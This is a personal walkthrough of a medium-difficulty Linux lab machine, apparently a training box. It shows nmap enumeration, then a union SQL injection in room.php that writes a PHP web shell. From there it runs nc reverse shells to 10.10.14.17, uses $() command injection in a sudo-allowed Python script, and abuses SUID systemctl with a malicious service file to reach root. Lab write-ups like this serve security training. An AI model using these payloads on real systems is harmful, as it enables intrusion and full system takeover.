
## Lab Details
- Difficulty: Medium
- OS: Linux

## Summary
- Initial access: Blind SQLi Union
- Privilege escalation: Vulnerable Script, Excessive Privilege of user account

## Enumeration
#### Steps
- run `nmap`
```
$ nmap  10.129.229.137 -p22,80,64999 -sC -sV -A -T5
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-31 01:48 EDT
Nmap scan report for 10.129.229.137
Host is up (0.0020s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Foothold

#### Steps
- Enumerate the web app
- Found a query endpoint at `rooms > book now`
```
http://10.129.229.137/room.php?cod=2
```
![[Pasted image 20260601114837.png]]
- Attempted with blind SQLi, starting with simple query like
```
1 order by 1
1 order by 2
...
1 order by 7
## when the column number is 8 the price went away 
1 order by 8
```
- To test for the output we can list the columns out from 1 to 7 
```
http://10.129.229.137/room.php?cod=-1 UNION SELECT 1, 2, 3, 4, 5, 6, 7 --
```
- We see that the 2,3,4 and 5 and outputted 
![[Pasted image 20260601114749.png]]
- Attempt to write web shell to web app directory 
```
http://10.129.229.137/room.php?cod=-1 UNION SELECT 1,'<?php system($_GET["cmd"]);?>',3,4,5,6,7 INTO OUTFILE '/var/www/html/cmd1.php'
```
- Visited the web shell and the current user is running as `www-data`
```
http://10.129.229.137/cmd1.php?cmd=id
```
![[Pasted image 20260601114547.png]]
- Inject a reverse shell payload
```
http://10.129.229.137/cmd1.php?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.17 4444 >/tmp/f
```
- Shell received
```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.17] from (UNKNOWN) [10.129.229.137] 42590
sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

## Lateral Movement 

#### Steps
- Load and run `linpeas.sh`
- Found the current user can run a script as user `pepper` without password
```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d (T1548.003)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```
- Examine the content of the script
```bash
www-data@jarvis:/tmp$ cat /var/www/Admin-Utilities/simpler.py
cat /var/www/Admin-Utilities/simpler.py
#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import re

def show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)

def show_header():
    print('''***********************************************
     _                 _
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/
                                @ironhackers.es

***********************************************
''')

def show_statistics():
    path = '/home/pepper/Web/Logs/'
    print('Statistics\n-----------')
    listed_files = listdir(path)
    count = len(listed_files)
    print('Number of Attackers: ' + str(count))
    level_1 = 0
    dat = datetime(1, 1, 1)
    ip_list = []
    reks = []
    ip = ''
    req = ''
    rek = ''
    for i in listed_files:
        f = open(path + i, 'r')
        lines = f.readlines()
        level2, rek = get_max_level(lines)
        fecha, requ = date_to_num(lines)
        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if fecha > dat:
            dat = fecha
            req = requ
            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if int(level2) > int(level_1):
            level_1 = level2
            ip_list = [ip]
            reks=[rek]
        elif int(level2) == int(level_1):
            ip_list.append(ip)
            reks.append(rek)
        f.close()

    print('Most Risky:')
    if len(ip_list) > 1:
        print('More than 1 ip found')
    cont = 0
    for i in ip_list:
        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
        cont = cont + 1

    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)

def list_ip():
    print('Attackers\n-----------')
    path = '/home/pepper/Web/Logs/'
    listed_files = listdir(path)
    for i in listed_files:
        f = open(path + i,'r')
        lines = f.readlines()
        level,req = get_max_level(lines)
        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
        f.close()

def date_to_num(lines):
    dat = datetime(1,1,1)
    ip = ''
    req=''
    for i in lines:
        if 'Level' in i:
            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
            regex = '(\d+)-(.*)-(\d+)(.*)'
            logEx=re.match(regex, fecha).groups()
            mes = to_dict(logEx[1])
            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
            if fecha > dat:
                dat = fecha
                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
    return dat, req

def to_dict(name):
    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
    return month_dict[name]

def get_max_level(lines):
    level=0
    for j in lines:
        if 'Level' in j:
            if int(j.split(' ')[4]) > int(level):
                level = j.split(' ')[4]
                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
    return level, req

def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()
```
- The `exec_ping` function filters for characters from user input however its not filtering `$()` which runs commands in a subshell 
```
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```
- Create a reverse shell and run the command with `-p` flag
```
www-data@jarvis:/tmp$ echo 'nc 10.10.14.17 4445 -e /bin/sh' > ./rev.sh
www-data@jarvis:/tmp$ chmod +x ./rev.sh
www-data@jarvis:/tmp$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/
                                @ironhackers.es

***********************************************

Enter an IP: $(/tmp/rev.sh)
```
- We get a reverse shell as user `pepper`
```
$ nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.17] from (UNKNOWN) [10.129.229.137] 38662

id
uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
```
## Privilege Escalation

#### Steps
- Load and run `linpeas.sh`
```
╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
strace Not Found
-rwsr-xr-x 1 root root 31K Aug 21  2018 /bin/fusermount
-rwsr-xr-x 1 root root 44K Mar  7  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 60K Nov 10  2016 /bin/ping
-rwsr-x--- 1 root pepper 171K Jun 29  2022 /bin/systemctl
<SNIP>
```
- `pepper` can run `systemctl` as root which we can use to perform privilege escalation
- First create a service file in `/dev/shm` like `/dev/shm/rev.service`
```
cat >rev.service<<EOF 
[Service] 
Type=notify 
ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.14.17 4446' 
KillMode=process 
Restart=on-failure 
RestartSec=42s 

[Install] 
WantedBy=multi-user.target 
EOF
```
- Then link it 
```
systemctl link /dev/shm/rev.service
```
- Run it
```
systemctl start rev
```
- We get a shell as root
```
$ nc -lvnp 4446
listening on [any] 4446 ...
connect to [10.10.14.17] from (UNKNOWN) [10.129.229.137] 35702
id
uid=0(root) gid=0(root) groups=0(root)
```
## Lessons Learned
- Attack family:
- Key takeaway:

## Resources
- References: